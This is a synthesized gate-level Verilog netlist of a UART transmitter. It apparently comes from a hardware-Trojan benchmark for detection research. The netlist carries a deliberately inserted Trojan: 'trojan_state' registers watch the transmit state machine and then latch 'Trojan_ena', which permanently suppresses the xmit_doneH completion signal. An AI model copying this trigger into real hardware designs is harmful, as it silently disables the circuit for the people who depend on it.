/* Generated by Yosys 0.9+3882 (git sha1 beeaad1, clang 3.8.0-2ubuntu4 -fPIC -Os) */

(* src = "u_xmit.v:4.1-259.10" *)
module u_xmit(clk, rst, uart_xmitH, xmitH, xmit_dataH, xmit_doneH);
  (* src = "u_xmit.v:86.1-90.27" *)
  wire [3:0] _000_;
  (* src = "u_xmit.v:110.1-114.53" *)
  wire [3:0] _001_;
  (* src = "u_xmit.v:93.1-107.40" *)
  wire [7:0] _002_;
  (* src = "u_xmit.v:250.1-256.30" *)
  wire _003_;
  wire _004_;
  wire _005_;
  wire _006_;
  wire _007_;
  wire _008_;
  wire _009_;
  wire _010_;
  wire _011_;
  wire _012_;
  wire _013_;
  wire _014_;
  wire _015_;
  wire _016_;
  wire _017_;
  wire _018_;
  wire _019_;
  wire _020_;
  wire _021_;
  wire _022_;
  wire _023_;
  wire _024_;
  wire _025_;
  wire _026_;
  wire _027_;
  wire _028_;
  wire _029_;
  wire _030_;
  wire _031_;
  wire _032_;
  wire _033_;
  wire _034_;
  wire _035_;
  wire _036_;
  wire _037_;
  wire _038_;
  wire _039_;
  wire _040_;
  wire _041_;
  wire _042_;
  wire _043_;
  wire _044_;
  wire _045_;
  wire _046_;
  wire _047_;
  wire _048_;
  wire _049_;
  wire _050_;
  wire _051_;
  wire _052_;
  wire _053_;
  wire _054_;
  wire _055_;
  wire _056_;
  wire _057_;
  wire _058_;
  wire _059_;
  wire _060_;
  wire _061_;
  wire _062_;
  wire _063_;
  wire _064_;
  wire _065_;
  wire _066_;
  wire _067_;
  wire _068_;
  wire _069_;
  wire _070_;
  wire _071_;
  wire _072_;
  wire _073_;
  wire _074_;
  wire _075_;
  wire _076_;
  wire _077_;
  wire _078_;
  wire _079_;
  wire _080_;
  wire _081_;
  wire _082_;
  wire _083_;
  wire _084_;
  (* src = "u_xmit.v:71.16-71.28" *)
  wire DataSend_ena;
  (* src = "u_xmit.v:40.13-40.23" *)
  reg Trojan_ena;
  (* src = "u_xmit.v:60.12-60.25" *)
  reg [3:0] bitCell_cntrH/*verilator public*/;
  (* src = "u_xmit.v:63.12-63.21" *)
  reg [3:0] bitCountH/*verilator public*/;
  (* src = "u_xmit.v:47.9-47.12" *)
  input clk;
  (* src = "u_xmit.v:57.12-57.22" *)
  wire [2:0] next_state;
  (* src = "u_xmit.v:48.9-48.12" *)
  input rst;
  (* src = "u_xmit.v:56.13-56.18" *)
  reg [2:0] state/*verilator public*/;
  (* src = "u_xmit.v:73.16-73.30" *)
  wire [2:0] state_DataSend;
  (* onehot = 32'd1 *)
  reg [2:0] trojan_state;
  (* src = "u_xmit.v:50.10-50.20" *)
  output uart_xmitH;
  (* src = "u_xmit.v:51.9-51.14" *)
  input xmitH;
  (* src = "u_xmit.v:62.12-62.26" *)
  reg [7:0] xmit_ShiftRegH;
  (* src = "u_xmit.v:52.13-52.23" *)
  input [7:0] xmit_dataH;
  (* src = "u_xmit.v:53.10-53.20" *)
  output xmit_doneH;
  reg xmit_doneH;
  assign _051_ = ~state[2];
  assign _052_ = state[0] | ~(state[1]);
  assign _053_ = _051_ & ~(_052_);
  assign _054_ = _053_ & trojan_state[2];
  assign _005_ = _054_ | trojan_state[1];
  assign _055_ = state[2] ^ state[1];
  assign _056_ = xmitH & ~(_055_);
  assign _057_ = state[0] | state[1];
  assign _058_ = _051_ & ~(_057_);
  assign _059_ = ~(_058_ | _053_);
  assign _060_ = ~(state[0] & state[1]);
  assign _061_ = _051_ & ~(_060_);
  assign _062_ = state[1] | ~(state[0]);
  assign _063_ = _062_ | _051_;
  assign _064_ = _061_ | ~(_063_);
  assign _065_ = _064_ | ~(_059_);
  assign _066_ = _056_ | ~(_065_);
  assign _067_ = _058_ & xmitH;
  assign _007_ = _067_ | _066_;
  assign _068_ = state[2] & ~(_057_);
  assign _069_ = _068_ & trojan_state[0];
  assign _070_ = trojan_state[2] & ~(_053_);
  assign _006_ = _070_ | _069_;
  assign _071_ = _055_ | xmitH;
  assign _072_ = bitCell_cntrH[1] & ~(bitCell_cntrH[0]);
  assign _073_ = ~(bitCell_cntrH[3] & bitCell_cntrH[2]);
  assign _074_ = _072_ & ~(_073_);
  assign _075_ = ~(bitCountH[1] | bitCountH[0]);
  assign _076_ = bitCountH[2] | ~(bitCountH[3]);
  assign _077_ = _075_ & ~(_076_);
  assign _037_ = _074_ & ~(_077_);
  assign _027_ = state[2] ? state[1] : state[0];
  assign _078_ = ~(_027_ & _037_);
  assign _079_ = ~(_078_ & _071_);
  assign _008_ = _079_ | _067_;
  assign _080_ = ~(state[2] ^ state[1]);
  assign _081_ = ~(bitCell_cntrH[1] & bitCell_cntrH[0]);
  assign _082_ = _081_ | _073_;
  assign _083_ = _082_ | _063_;
  assign _084_ = _080_ ? xmitH : _083_;
  assign _003_ = ~(_084_ | Trojan_ena);
  assign _009_ = _078_ | bitCountH[0];
  assign _001_[0] = _071_ & ~(_009_);
  assign _010_ = ~(bitCountH[1] ^ bitCountH[0]);
  assign _011_ = _010_ | _078_;
  assign _001_[1] = _071_ & ~(_011_);
  assign _012_ = ~(bitCountH[1] & bitCountH[0]);
  assign _013_ = _012_ ^ bitCountH[2];
  assign _014_ = _013_ | _078_;
  assign _001_[2] = _071_ & ~(_014_);
  assign _015_ = _012_ | ~(bitCountH[2]);
  assign _016_ = _015_ ^ bitCountH[3];
  assign _017_ = _016_ | _078_;
  assign _001_[3] = _071_ & ~(_017_);
  assign _018_ = ~_065_;
  assign _002_[7] = _056_ ? xmit_dataH[7] : _018_;
  assign _019_ = xmit_ShiftRegH[1] & ~(_065_);
  assign _002_[0] = _056_ ? xmit_dataH[0] : _019_;
  assign _020_ = xmit_ShiftRegH[2] & ~(_065_);
  assign _002_[1] = _056_ ? xmit_dataH[1] : _020_;
  assign _021_ = xmit_ShiftRegH[3] & ~(_065_);
  assign _002_[2] = _056_ ? xmit_dataH[2] : _021_;
  assign _022_ = xmit_ShiftRegH[4] & ~(_065_);
  assign _002_[3] = _056_ ? xmit_dataH[3] : _022_;
  assign _023_ = xmit_ShiftRegH[5] & ~(_065_);
  assign _002_[4] = _056_ ? xmit_dataH[4] : _023_;
  assign _024_ = xmit_ShiftRegH[6] & ~(_065_);
  assign _002_[5] = _056_ ? xmit_dataH[5] : _024_;
  assign _025_ = xmit_ShiftRegH[7] & ~(_065_);
  assign _002_[6] = _056_ ? xmit_dataH[6] : _025_;
  assign _026_ = ~_074_;
  assign _028_ = state[2] ? _062_ : _052_;
  assign _029_ = _082_ & ~(_028_);
  assign _030_ = _027_ ? _026_ : _029_;
  assign _000_[0] = _030_ & ~(bitCell_cntrH[0]);
  assign _031_ = ~(bitCell_cntrH[1] ^ bitCell_cntrH[0]);
  assign _000_[1] = _030_ & ~(_031_);
  assign _032_ = _081_ ^ bitCell_cntrH[2];
  assign _000_[2] = _030_ & ~(_032_);
  assign _033_ = _081_ | ~(bitCell_cntrH[2]);
  assign _034_ = _033_ ^ bitCell_cntrH[3];
  assign _000_[3] = _030_ & ~(_034_);
  assign _035_ = _063_ | ~(_082_);
  assign _036_ = _035_ & ~(_068_);
  assign _038_ = _061_ & ~(_037_);
  assign _039_ = _053_ & ~(_082_);
  assign _040_ = _039_ | _038_;
  assign _041_ = _036_ & ~(_040_);
  assign next_state[0] = _055_ & ~(_041_);
  assign _042_ = _061_ & ~(_074_);
  assign _043_ = _042_ | _053_;
  assign _044_ = _043_ | _068_;
  assign next_state[1] = _055_ ? _044_ : xmitH;
  assign _045_ = _074_ & _061_;
  assign _046_ = _035_ & ~(_045_);
  assign next_state[2] = _055_ & ~(_046_);
  assign _047_ = state[2] ? _062_ : _057_;
  assign _048_ = state[2] ? _057_ : _060_;
  assign _049_ = _047_ & ~(_048_);
  assign _050_ = _048_ ^ _047_;
  assign uart_xmitH = _049_ ? xmit_ShiftRegH[0] : _050_;
  assign _004_ = trojan_state[0] & ~(_068_);
  always @(posedge clk, negedge rst)
    if (!rst) trojan_state[0] <= 1'h1;
    else trojan_state[0] <= _004_;
  always @(posedge clk, negedge rst)
    if (!rst) trojan_state[1] <= 1'h0;
    else trojan_state[1] <= _005_;
  always @(posedge clk, negedge rst)
    if (!rst) trojan_state[2] <= 1'h0;
    else trojan_state[2] <= _006_;
  (* src = "u_xmit.v:250.1-256.30" *)
  always @(posedge clk, negedge rst)
    if (!rst) xmit_doneH <= 1'h0;
    else xmit_doneH <= _003_;
  (* src = "u_xmit.v:118.1-120.28" *)
  always @(posedge clk, negedge rst)
    if (!rst) state[0] <= 1'h0;
    else state[0] <= next_state[0];
  (* src = "u_xmit.v:118.1-120.28" *)
  always @(posedge clk, negedge rst)
    if (!rst) state[1] <= 1'h0;
    else state[1] <= next_state[1];
  (* src = "u_xmit.v:118.1-120.28" *)
  always @(posedge clk, negedge rst)
    if (!rst) state[2] <= 1'h0;
    else state[2] <= next_state[2];
  (* src = "u_xmit.v:86.1-90.27" *)
  always @(posedge clk, negedge rst)
    if (!rst) bitCell_cntrH[0] <= 1'h0;
    else bitCell_cntrH[0] <= _000_[0];
  (* src = "u_xmit.v:86.1-90.27" *)
  always @(posedge clk, negedge rst)
    if (!rst) bitCell_cntrH[1] <= 1'h0;
    else bitCell_cntrH[1] <= _000_[1];
  (* src = "u_xmit.v:86.1-90.27" *)
  always @(posedge clk, negedge rst)
    if (!rst) bitCell_cntrH[2] <= 1'h0;
    else bitCell_cntrH[2] <= _000_[2];
  (* src = "u_xmit.v:86.1-90.27" *)
  always @(posedge clk, negedge rst)
    if (!rst) bitCell_cntrH[3] <= 1'h0;
    else bitCell_cntrH[3] <= _000_[3];
  (* src = "u_xmit.v:93.1-107.40" *)
  always @(posedge clk, negedge rst)
    if (!rst) xmit_ShiftRegH[0] <= 1'h0;
    else if (_007_) xmit_ShiftRegH[0] <= _002_[0];
  (* src = "u_xmit.v:93.1-107.40" *)
  always @(posedge clk, negedge rst)
    if (!rst) xmit_ShiftRegH[1] <= 1'h0;
    else if (_007_) xmit_ShiftRegH[1] <= _002_[1];
  (* src = "u_xmit.v:93.1-107.40" *)
  always @(posedge clk, negedge rst)
    if (!rst) xmit_ShiftRegH[2] <= 1'h0;
    else if (_007_) xmit_ShiftRegH[2] <= _002_[2];
  (* src = "u_xmit.v:93.1-107.40" *)
  always @(posedge clk, negedge rst)
    if (!rst) xmit_ShiftRegH[3] <= 1'h0;
    else if (_007_) xmit_ShiftRegH[3] <= _002_[3];
  (* src = "u_xmit.v:93.1-107.40" *)
  always @(posedge clk, negedge rst)
    if (!rst) xmit_ShiftRegH[4] <= 1'h0;
    else if (_007_) xmit_ShiftRegH[4] <= _002_[4];
  (* src = "u_xmit.v:93.1-107.40" *)
  always @(posedge clk, negedge rst)
    if (!rst) xmit_ShiftRegH[5] <= 1'h0;
    else if (_007_) xmit_ShiftRegH[5] <= _002_[5];
  (* src = "u_xmit.v:93.1-107.40" *)
  always @(posedge clk, negedge rst)
    if (!rst) xmit_ShiftRegH[6] <= 1'h0;
    else if (_007_) xmit_ShiftRegH[6] <= _002_[6];
  (* src = "u_xmit.v:93.1-107.40" *)
  always @(posedge clk, negedge rst)
    if (!rst) xmit_ShiftRegH[7] <= 1'h0;
    else if (_007_) xmit_ShiftRegH[7] <= _002_[7];
  (* src = "u_xmit.v:110.1-114.53" *)
  always @(posedge clk, negedge rst)
    if (!rst) bitCountH[0] <= 1'h0;
    else if (_008_) bitCountH[0] <= _001_[0];
  (* src = "u_xmit.v:110.1-114.53" *)
  always @(posedge clk, negedge rst)
    if (!rst) bitCountH[1] <= 1'h0;
    else if (_008_) bitCountH[1] <= _001_[1];
  (* src = "u_xmit.v:110.1-114.53" *)
  always @(posedge clk, negedge rst)
    if (!rst) bitCountH[2] <= 1'h0;
    else if (_008_) bitCountH[2] <= _001_[2];
  (* src = "u_xmit.v:110.1-114.53" *)
  always @(posedge clk, negedge rst)
    if (!rst) bitCountH[3] <= 1'h0;
    else if (_008_) bitCountH[3] <= _001_[3];
  (* src = "u_xmit.v:219.3-221.59" *)
  always @(posedge clk, negedge rst)
    if (!rst) Trojan_ena <= 1'h0;
    else if (trojan_state[1]) Trojan_ena <= 1'h1;
  assign DataSend_ena = 1'h0;
  assign state_DataSend = 3'hx;
endmodule
